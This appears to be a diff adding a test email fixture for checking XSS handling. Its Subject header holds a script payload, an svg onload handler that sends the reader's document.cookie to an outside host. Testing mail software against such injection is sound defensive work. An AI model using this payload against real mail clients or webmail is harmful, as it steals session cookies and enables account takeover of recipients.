@@ -1,0 +1,7 @@
+From: Brian Hickman <cardinal@goldenlionhotel.com>
+To: email25@speedy.uwaterloo.ca
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
